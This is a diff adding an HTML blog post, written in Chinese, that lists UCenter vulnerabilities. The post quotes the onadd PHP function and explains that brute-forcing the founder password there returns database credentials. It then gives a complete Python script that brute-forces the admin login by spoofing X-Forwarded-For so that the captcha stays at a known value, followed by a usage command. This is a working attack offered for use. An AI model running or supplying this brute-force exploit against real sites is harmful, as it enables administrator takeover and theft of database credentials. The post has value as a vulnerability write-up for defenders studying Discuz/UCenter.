@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+  <link rel="manifest" href="/images/site.webmanifest.json">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://5cr1pt.github.io/blog.securitainment.io').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="暴力破解创始人密码  漏洞文件:&#x2F;control&#x2F;app.php:34:onadd  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859function onadd() &amp;#123;	$ucfounderpw &#x3D; getgpc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ucenter vuls list">
+<meta property="og:url" content="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-ucenter-bug-list/index.html">
+<meta property="og:site_name" content="Securitainment.io">
+<meta property="og:description" content="暴力破解创始人密码  漏洞文件:&#x2F;control&#x2F;app.php:34:onadd  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859function onadd() &amp;#123;	$ucfounderpw &#x3D; getgpc">
+<meta property="og:image" content="http://www.0-f.org/wp-content/uploads/2014/12/Disc_.jpg">
+<meta property="og:image" content="http://www.wooyun.org/upload/201410/2106555215e9de33121ac345e389897e7a033bb1.png">
+<meta property="og:image" content="http://www.wooyun.org/upload/201410/21071436735b1f7ae3a6d308d74b2a37b80b090e.png">
+<meta property="og:image" content="http://www.wooyun.org/upload/201410/21065832e3c6315987a3a5ba66db3d66ae619422.png">
+<meta property="article:published_time" content="2016-05-13T16:51:04.000Z">
+<meta property="article:modified_time" content="2019-07-25T06:26:35.000Z">
+<meta property="article:author" content="groot">
+<meta property="article:tag" content="pentest">
+<meta property="article:tag" content="ucenter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.0-f.org/wp-content/uploads/2014/12/Disc_.jpg">
+
+<link rel="canonical" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-ucenter-bug-list/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Ucenter vuls list | Securitainment.io</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Securitainment.io</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="default">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-ucenter-bug-list/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Ucenter vuls list
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:51:04" itemprop="dateCreated datePublished" datetime="2016-05-14T00:51:04+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:26:35" itemprop="dateModified" datetime="2019-07-25T14:26:35+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/2016-05-14-ucenter-bug-list/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-ucenter-bug-list/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <a id="more"></a>
+
+<ol>
+<li><p>暴力破解创始人密码</p>
+<p> 漏洞文件:<code>/control/app.php:34:onadd</code></p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onadd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$ucfounderpw = getgpc(<span class="string">'ucfounderpw'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$apptype = getgpc(<span class="string">'apptype'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appname = getgpc(<span class="string">'appname'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appurl = getgpc(<span class="string">'appurl'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appip = getgpc(<span class="string">'appip'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$viewprourl = getgpc(<span class="string">'viewprourl'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appcharset = getgpc(<span class="string">'appcharset'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appdbcharset = getgpc(<span class="string">'appdbcharset'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$apptagtemplates = getgpc(<span class="string">'apptagtemplates'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appallowips = getgpc(<span class="string">'allowips'</span>, <span class="string">'P'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(md5(md5($ucfounderpw).UC_FOUNDERSALT) == UC_FOUNDERPW || (strlen($ucfounderpw) == <span class="number">32</span> &amp;amp;&amp;amp; $ucfounderpw == md5(UC_FOUNDERPW))) &#123;</span><br><span class="line">		@ob_start();</span><br><span class="line">		$return  = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">		$app = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;fetch_first(&amp;quot;SELECT * FROM &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications WHERE url=<span class="string">'$appurl'</span> <span class="keyword">AND</span> type=<span class="string">'$apptype'</span>&amp;quot;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($app)) &#123;</span><br><span class="line">			$authkey = <span class="keyword">$this</span>-&amp;gt;_generate_key();</span><br><span class="line">			$apptagtemplates = <span class="keyword">$this</span>-&amp;gt;serialize($apptagtemplates, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;db-&amp;gt;query(&amp;quot;INSERT INTO &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications SET</span><br><span class="line">				name=<span class="string">'$appname'</span>,</span><br><span class="line">				url=<span class="string">'$appurl'</span>,</span><br><span class="line">				ip=<span class="string">'$appip'</span>,</span><br><span class="line">				authkey=<span class="string">'$authkey'</span>,</span><br><span class="line">				viewprourl=<span class="string">'$viewprourl'</span>,</span><br><span class="line">				synlogin=<span class="string">'1'</span>,</span><br><span class="line">				charset=<span class="string">'$appcharset'</span>,</span><br><span class="line">				dbcharset=<span class="string">'$appdbcharset'</span>,</span><br><span class="line">				type=<span class="string">'$apptype'</span>,</span><br><span class="line">				recvnote=<span class="string">'1'</span>,</span><br><span class="line">				tagtemplates=<span class="string">'$apptagtemplates'</span>,</span><br><span class="line">				allowips=<span class="string">'$appallowips'</span></span><br><span class="line">				&amp;quot;);</span><br><span class="line">			$appid = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;insert_id();</span><br><span class="line"></span><br><span class="line">			$_ENV[<span class="string">'app'</span>]-&amp;gt;alter_app_table($appid, <span class="string">'ADD'</span>);</span><br><span class="line">			<span class="comment">//$return = &amp;quot;UC_STATUS_OK|$authkey|$appid|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span></span><br><span class="line">			$return = &amp;quot;$authkey|$appid|&amp;quot;.UC_DBHOST.<span class="string">'|'</span>.UC_DBNAME.<span class="string">'|'</span>.UC_DBUSER.<span class="string">'|'</span>.UC_DBPW.<span class="string">'|'</span>.UC_DBCHARSET.<span class="string">'|'</span>.UC_DBTABLEPRE.<span class="string">'|'</span>.UC_CHARSET;</span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;load(<span class="string">'cache'</span>);</span><br><span class="line">			$_ENV[<span class="string">'cache'</span>]-&amp;gt;updatedata(<span class="string">'apps'</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;load(<span class="string">'note'</span>);</span><br><span class="line">			$notedata = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;fetch_all(&amp;quot;SELECT appid, type, name, url, ip, charset, synlogin, extra FROM &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications&amp;quot;);</span><br><span class="line">			$notedata = <span class="keyword">$this</span>-&amp;gt;_format_notedata($notedata);</span><br><span class="line">			$notedata[<span class="string">'UC_API'</span>] = UC_API;</span><br><span class="line">			$_ENV[<span class="string">'note'</span>]-&amp;gt;add(<span class="string">'updateapps'</span>, <span class="string">''</span>, <span class="keyword">$this</span>-&amp;gt;serialize($notedata, <span class="number">1</span>));</span><br><span class="line">			$_ENV[<span class="string">'note'</span>]-&amp;gt;send();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">//$return = &amp;quot;UC_STATUS_OK|$app[authkey]|$app[appid]|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span></span><br><span class="line">			$return = &amp;quot;$app[authkey]|$app[appid]|&amp;quot;.UC_DBHOST.<span class="string">'|'</span>.UC_DBNAME.<span class="string">'|'</span>.UC_DBUSER.<span class="string">'|'</span>.UC_DBPW.<span class="string">'|'</span>.UC_DBCHARSET.<span class="string">'|'</span>.UC_DBTABLEPRE.<span class="string">'|'</span>.UC_CHARSET;</span><br><span class="line">		&#125;</span><br><span class="line">		@ob_end_clean();</span><br><span class="line">		<span class="keyword">exit</span>($return);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'-1'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 这个函数的意思是 添加一个应用,前提是需要创始人的密码。如果密码正确,就会添加一个应用（如果重复了就直接输出）。</p>
+<p> 如何利用：</p>
+<p> <img src="http://www.0-f.org/wp-content/uploads/2014/12/Disc_.jpg" alt=""></p>
+<p> 截获个数据包然后放入burp中添加密码字典进行批量破解。<br> 成功会返回添加应用的信息，反之返回 -1。<br> 在一些网站中往往把 uc_server/admin.php做了访问限制.<br> 而index.php这里就可以直接调用破解。返回的应用信息还可以直接getshell或注入。<br> 测试版本：Discuz! X3.2 搭载的 UCenter 1.6.0</p>
+</li>
+<li><p>暴力破解创始人密码02</p>
+<p> 后台地址一般为：<code>**.**.**.**/discuz/uc_server/admin.php</code></p>
+<p> <img src="http://www.wooyun.org/upload/201410/2106555215e9de33121ac345e389897e7a033bb1.png" alt=""></p>
+<p> 含有一个验证码，验证码的地址为：</p>
+<blockquote>
+<p><a href="http://localhost/discuz/uc_server/admin.php?m=seccode&amp;seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&amp;7500" target="_blank" rel="noopener">http://localhost/discuz/uc_server/admin.php?m=seccode&amp;seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&amp;7500</a></p>
+</blockquote>
+<p> 但是，经过测试发现，登录uc_server的时候 如果ip第一次出现那么 seccode的默认值为cccc，而 ip地址 是通过X-Forwarded-For 获取的。也就是我们修改xff的ip之后，再次打开上面那个验证码url，图片的值为cccc</p>
+<p> <img src="http://www.wooyun.org/upload/201410/21071436735b1f7ae3a6d308d74b2a37b80b090e.png" alt=""></p>
+<p> 所以可以写一个程序通过修改X-Forwarded-For的值爆破密码。</p>
+ <poc>
+
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> httplib,re,random,urllib,time,requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># Boom</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHtml</span><span class="params">(host, htmlhash, htmlpass, htmlseccode)</span>:</span></span><br><span class="line">    url = <span class="string">'http://'</span> + host + <span class="string">'/uc_server/admin.php?m=user&amp;a=login'</span></span><br><span class="line">    ip = str(random.randint(<span class="number">1</span>,<span class="number">100</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>))</span><br><span class="line"></span><br><span class="line">    postHead = &#123;<span class="string">'host'</span>: host,</span><br><span class="line">                <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0'</span>,</span><br><span class="line">                <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">                <span class="string">'Accept-Language'</span>: <span class="string">'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3'</span>,</span><br><span class="line">                <span class="string">'X-Forwarded-For'</span>: ip,</span><br><span class="line">                <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">                <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span> &#125;</span><br><span class="line">    postContent = <span class="string">'sid=&amp;formhash='</span> + htmlhash + <span class="string">'&amp;seccodehidden='</span> + htmlseccode + <span class="string">'&amp;iframe=0&amp;isfounder=1&amp;password='</span> + htmlpass + <span class="string">'&amp;seccode=cccc&amp;submit=%E7%99%BB+%E5%BD%95'</span></span><br><span class="line">    <span class="comment"># resultHtml = httplib.HTTPConnection(host, 80, False)</span></span><br><span class="line">    <span class="comment"># resultHtml.request('POST', '/uc_server/admin.php?m=user&amp;a=login',</span></span><br><span class="line">    <span class="comment">#                    body = postContent,</span></span><br><span class="line">    <span class="comment">#                    headers = postHead )</span></span><br><span class="line">    <span class="comment"># page = resultHtml.getresponse()</span></span><br><span class="line">    <span class="comment"># pageConect = page.read()</span></span><br><span class="line">    page = requests.post(url, headers = postHead, data = postContent)</span><br><span class="line">    <span class="keyword">print</span> str(page.status_code) + <span class="string">'\t'</span> + str(page.history) + <span class="string">'\t'</span> + htmlpass</span><br><span class="line">    pageConect = page.text</span><br><span class="line">    pageSoup = BeautifulSoup(pageConect, <span class="string">"lxml"</span>)</span><br><span class="line">    pageTitle = pageSoup.title.string</span><br><span class="line">    <span class="keyword">return</span> pageTitle,page.status_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get formhash and seccodehidden</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethashs</span><span class="params">(host)</span>:</span></span><br><span class="line">    url = <span class="string">'http://'</span> + host + <span class="string">'/uc_server/admin.php'</span></span><br><span class="line">    pageContent = requests.get(url).text</span><br><span class="line">    r1 = re.compile(<span class="string">r'&lt;input type="hidden" name="formhash" value="(\S+)" /&gt;'</span>)</span><br><span class="line">    htmlhash = r1.findall(pageContent)[<span class="number">0</span>]</span><br><span class="line">    r2 = re.compile(<span class="string">r'&lt;input type="hidden" name="seccodehidden" value="(\S+)" /&gt;'</span>)</span><br><span class="line">    htmlseccode = r2.findall(pageContent)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> htmlhash + <span class="string">' '</span> + htmlseccode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get host/dict/sleeptime</span></span><br><span class="line"><span class="keyword">if</span>(len(argv)==<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'----&gt;python '</span> + argv[<span class="number">0</span>] + <span class="string">' host dictfile sleeptime'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'----&gt;python '</span> + argv[<span class="number">0</span>] + <span class="string">' **.**.**.** pass.txt 0.2'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = argv[<span class="number">1</span>]</span><br><span class="line">    passfile = argv[<span class="number">2</span>]</span><br><span class="line">    sleeptime = argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;host:\t'</span> + host</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;password file:\t'</span> + passfile</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;sleeptime:\t'</span> + sleeptime</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;\n'</span></span><br><span class="line"></span><br><span class="line">    x = gethashs(host).split(<span class="string">' '</span>)</span><br><span class="line">    f = open(passfile, <span class="string">'r'</span>)</span><br><span class="line">    htmlpass = f.readlines()</span><br><span class="line">    <span class="comment"># temp = htmlpass[:]</span></span><br><span class="line">    <span class="comment"># nf = open('temp.new', 'w')</span></span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(htmlpass)):</span><br><span class="line">        pwd = str(htmlpass[i].split())</span><br><span class="line">        time.sleep(float(sleeptime))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(getHtml(host, x[<span class="number">0</span>], pwd, x[<span class="number">1</span>])[<span class="number">0</span>] == <span class="string">''</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'----&gt;Password is: '</span> + pwd</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> sys.exc_info()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#     finally:</span></span><br><span class="line">    <span class="comment">#         temp.remove(htmlpass[i])</span></span><br><span class="line">    <span class="comment">#     if i == 1:</span></span><br><span class="line">    <span class="comment">#         raise NameError('test')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># nf.writelines(temp)</span></span><br><span class="line">                    </span><br><span class="line">    <span class="comment"># f.close()</span></span><br><span class="line">    <span class="comment"># nf.close()</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     time.sleep(5.0)</span></span><br><span class="line">        <span class="comment">#     result = getHtml(host, x[0], pwd, x[1])</span></span><br><span class="line">        <span class="comment"># if(result[0] == "UCenter Administrator's Control Panel"):</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line">        <span class="comment"># elif 5 in result[1]:</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     print '----&gt;Password is: ' + pwd</span></span><br><span class="line">        <span class="comment">#     break</span></span><br></pre></td></tr></table></figure>
+
+<p> <code>python dz.py **.**.**.** pass.txt 0</code></p>
+<p> <img src="http://www.wooyun.org/upload/201410/21065832e3c6315987a3a5ba66db3d66ae619422.png" alt=""></p>
+</li>
+<li></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pentest/" rel="tag"># pentest</a>
+              <a href="/tags/ucenter/" rel="tag"># ucenter</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2016/05/14/2016-05-14-discuz-bug-list/" rel="prev" title="Discuz vuls list">
+      <i class="fa fa-chevron-left"></i> Discuz vuls list
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2016/05/14/2016-05-14-discuz-admin_styles.inc.php-get-webshell/" rel="next" title="Discuz! admin_styles.inc.php get-webshell bug">
+      Discuz! admin_styles.inc.php get-webshell bug <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">groot</p>
+  <div class="site-description" itemprop="description">运维 | 安全 | 渗透</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
